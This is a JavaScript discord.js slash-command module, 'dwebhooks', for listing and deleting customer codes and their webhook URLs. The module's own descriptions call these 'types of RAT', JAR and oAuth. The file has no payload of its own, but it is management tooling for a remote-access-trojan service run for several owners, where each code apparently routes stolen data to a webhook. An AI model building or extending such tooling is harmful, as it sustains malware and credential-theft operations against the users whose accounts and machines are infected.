import { SlashCommandBuilder, EmbedBuilder, PermissionFlagsBits, ActionRowBuilder, ButtonBuilder } from "discord.js";
import * as oAuthDB from "/root/oAuth/database.js";

export const data = new SlashCommandBuilder()
  .setName("dwebhooks")
  .setDescription("Manage Webhooks.")
  .addSubcommand((subcommand) =>
    subcommand
      .setName("delete")
      .setDescription("Deletes a code.")
      .addStringOption((option) =>
        option
          .setName("type")
          .setDescription("The type of the RAT to delete.")
          .setRequired(true)
          .addChoices({ name: "JAR", value: "jar" }, { name: "oAuth", value: "oauth" })
      )
      .addStringOption((option) => option.setName("code").setDescription("The code to delete.").setRequired(true))
  )
  .addSubcommand((subcommand) =>
    subcommand
      .setName("list")
      .setDescription("Lists all webhooks.")
      .addStringOption((option) =>
        option
          .setName("type")
          .setDescription("The type of the RAT to list.")
          .setRequired(true)
          .addChoices({ name: "JAR", value: "jar" }, { name: "oAuth", value: "oauth" })
      )
      .addUserOption((option) => option.setName("owner").setDescription("The bot owner."))
  )
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .setDMPermission(false);

export async function execute(client, interaction) {
  if (!client.config.devs.includes(interaction.user.id)) {
    return client.sendErrorEmbed(interaction, "You are not allowed to use this command.");
  }

  const subcommand = interaction.options.getSubcommand();
  if (subcommand == "delete") {
    const type = interaction.options.getString("type");
    const code = interaction.options.getString("code");
    if (type == "jar") {
      const webhookInfo = await client.db.getWebhook(code);
      if (!webhookInfo) {
        return client.sendErrorEmbed(interaction, "This code does not exist");
      }
      await client.db.deleteWebhook(code);

      const embed = new EmbedBuilder()
        .setColor("Red")
        .setTitle("🚫 JAR Code Deleted")
        .addFields(
          { name: "Code", value: `\`\`\`${code}\`\`\``, inline: false },
          { name: "Webhook", value: `\`\`\`${webhookInfo.webhook}\`\`\``, inline: false }
        );

      await interaction.reply({ embeds: [embed], ephemeral: true });
    } else if (type == "oauth") {
      const webhookInfo = await oAuthDB.getWebhook(code);
      if (!webhookInfo) {
        return client.sendErrorEmbed(interaction, "This code does not exist");
      }
      await oAuthDB.deleteWebhook(code);

      const embed = new EmbedBuilder()
        .setColor("Red")
        .setTitle("🚫 oAuth Code Deleted")
        .addFields(
          { name: "Code", value: `\`\`\`${code}\`\`\``, inline: false },
          { name: "Webhook", value: `\`\`\`${webhookInfo.webhook}\`\`\``, inline: false }
        );

      await interaction.reply({ embeds: [embed], ephemeral: true });
    }
  } else if (subcommand == "list") {
    const type = interaction.options.getString("type");
    const owner = interaction.options.getUser("owner");
    const id = interaction.user.id;
    const embeds = [];
    var page = 0;

    if (type == "jar") {
      const webhooks = owner ? await client.db.getWebhooks(owner.id) : await client.db.getAllWebhooks();
      var embed = new EmbedBuilder().setColor("Purple").setTitle("JAR Webhooks");
      var i = 0;

      for (const { user_id: id, code, webhook } of webhooks) {
        i++;
        embed.addFields(
          { name: `${i}. Code`, value: `\`\`\`${code}\`\`\``, inline: true },
          { name: "Webhook", value: `\`\`\`${webhook}\`\`\``, inline: true },
          { name: "Owner ID", value: `\`\`\`${id}\`\`\``, inline: true }
        );

        if (i % 5 == 0) {
          embeds.push(embed);
          embed = new EmbedBuilder().setColor("Purple").setTitle("JAR Webhooks");
        }
      }
      if (i == 0 || i % 5 !== 0) {
        embeds.push(embed);
      }
    } else if (type == "oauth") {
      const webhooks = owner ? await oAuthDB.getWebhooks(owner.id) : await oAuthDB.getAllWebhooks();
      var embed = new EmbedBuilder().setColor("Purple").setTitle("oAuth Webhooks");
      var i = 0;

      for (const { owner: id, code, webhook } of webhooks) {
        i++;
        embed.addFields(
          { name: `${i}. Code`, value: `\`\`\`${code}\`\`\``, inline: true },
          { name: "Webhook", value: `\`\`\`${webhook}\`\`\``, inline: true },
          { name: "Owner ID", value: `\`\`\`${id}\`\`\``, inline: true }
        );

        if (i % 5 == 0) {
          embeds.push(embed);
          embed = new EmbedBuilder().setColor("Purple").setTitle("oAuth Webhooks");
        }
      }
      if (i == 0 || i % 5 !== 0) {
        embeds.push(embed);
      }
    }

    const pageEmbed = embeds[page];

    const filter = (i) => i.user.id === interaction.user.id;
    const time = 1000 * 60 * 5;

    await interaction.reply({ ephemeral: true, embeds: [pageEmbed], components: [getRow(page, embeds, id)] });

    const collector = interaction.channel.createMessageComponentCollector({ filter, time });

    collector.on("collect", async (i) => {
      if (!i) {
        return;
      }

      await i.deferUpdate();

      if (i.customId != "prev_embed" && i.customId != "next_embed") {
        return;
      }

      if (i.customId == "prev_embed" && page > 0) {
        page--;
      } else if (i.customId == "next_embed" && page < embeds.length - 1) {
        page++;
      }

      await interaction.editReply({ embeds: [embeds[page]], components: [getRow(page, embeds, id)] });
    });
  }
}

function getRow(page, embeds, id) {
  const row = new ActionRowBuilder();

  row.addComponents(
    new ButtonBuilder()
      .setCustomId("prev_embed")
      .setStyle("Secondary")
      .setEmoji("◀️")
      .setDisabled(page == 0)
  );

  row.addComponents(
    new ButtonBuilder()
      .setCustomId("next_embed")
      .setStyle("Secondary")
      .setEmoji("▶️")
      .setDisabled(page == embeds.length - 1)
  );

  return row;
}
